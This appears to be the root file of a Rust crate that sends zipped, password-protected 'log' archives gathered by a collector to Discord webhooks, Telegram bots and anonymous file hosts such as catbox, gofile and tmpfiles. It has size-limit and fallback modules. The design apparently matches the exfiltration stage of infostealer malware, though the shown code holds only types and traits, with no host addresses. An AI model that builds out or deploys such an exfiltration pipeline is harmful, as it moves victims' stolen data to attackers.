#![no_std]

extern crate alloc;
pub mod catbox;
pub mod discord_webhook;
pub mod external_upload;
pub mod fallback;
pub mod gofile;
pub mod size_fallback;
pub mod size_limit;
pub mod telegram_bot;
pub mod tmpfiles;

use alloc::sync::Arc;
use alloc::vec::Vec;
use collector::Collector;
use derive_new::new;
use zip::ZipArchive;

#[derive(Debug)]
pub enum SendError {
    Network,
    UnsupportedLogFile,
    LogFileTooBig,
}

/// Represents a link to an external log file with associated metadata.
#[derive(new, Clone)]
pub struct ExternalLink {
    /// The service name where the log file is located.
    #[new(into)]
    service_name: Arc<str>,
    /// The URL pointing to the `.zip` log archive.
    #[new(into)]
    link: Arc<str>,
    /// The size of the log file in bytes.
    size: usize,
}

/// Represents the content of a log file to be sent or processed.
#[derive(Clone)]
pub enum LogContent {
    /// An external link to a `.zip` log archive with metadata.
    ExternalLink(ExternalLink),
    /// The raw bytes of a `.zip` log archive.
    ZipArchive(Arc<[u8]>),
}

/// Represents a named log file with content.
#[derive(new, Clone)]
pub struct LogFile {
    /// The name of the log file, including its extension.
    #[new(into)]
    name: Arc<str>,
    /// The content of the log file.
    #[new(into)]
    content: LogContent,
}

impl LogFile {
    /// Returns a new `LogFile` with the same name but new content.
    pub fn change_content(&self, new_content: LogContent) -> Self {
        Self {
            name: self.name.clone(),
            content: new_content,
        }
    }
}

impl From<Vec<u8>> for LogContent {
    fn from(value: Vec<u8>) -> Self {
        LogContent::ZipArchive(Arc::from(value))
    }
}

impl From<ZipArchive> for LogContent {
    fn from(value: ZipArchive) -> Self {
        LogContent::ZipArchive(value.create().into())
    }
}

/// A trait for sending log files to a destination service.
pub trait LogSender: Clone {
    /// Sends a log file to the destination service.
    ///
    /// # Parameters
    ///
    /// - `log_file`: A [`LogFile`] struct representing the log file to send.
    /// - `password`: An [`Option<String>`] that specifies the password for the archive, if it is password-protected.
    /// - `collector`: A type that implements the [`Collector`] trait, providing log-related metadata or additional context.
    ///
    /// # Returns
    ///
    /// - `Result<(), SendError>`: Returns `Ok(())` if the log was sent successfully, or a [`SendError`] if the operation failed.
    fn send<P, C>(
        &self,
        log_file: LogFile,
        password: Option<P>,
        collector: &C,
    ) -> Result<(), SendError>
    where
        P: AsRef<str> + Clone,
        C: Collector;
}

/// An extension trait for [`LogSender`] that provides convenience methods.
///
/// This trait adds utility functionality to types that implement [`LogSender`].
pub trait LogSenderExt: LogSender {
    /// Sends a zipped archive of logs to the destination service.
    ///
    /// # Parameters
    ///
    /// - `archive`: A [`ZipArchive`] reference, representing the zipped logs to be sent.
    /// - `collector`: A type that implements the [`Collector`] trait, providing log-related metadata or additional context.
    ///
    /// # Returns
    ///
    /// - `Result<(), SendError>`: Returns `Ok(())` if the log was sent successfully, or a [`SendError`] if the operation failed.
    ///
    /// # Notes
    ///
    /// This method automatically extracts the password from the archive if one is set,
    /// and converts the archive into a [`LogContent::ZipArchive`].
    fn send_archive<N, A, C>(&self, name: N, archive: A, collector: &C) -> Result<(), SendError>
    where
        N: Into<Arc<str>>,
        A: AsRef<ZipArchive>,
        C: Collector;
}

impl<T: LogSender> LogSenderExt for T {
    fn send_archive<N, A, C>(&self, name: N, archive: A, collector: &C) -> Result<(), SendError>
    where
        N: Into<Arc<str>>,
        A: AsRef<ZipArchive>,
        C: Collector,
    {
        let archive = archive.as_ref();

        let password = archive.get_password();
        let archive = LogFile::new(name, archive.create());

        self.send(archive, password, collector)
    }
}
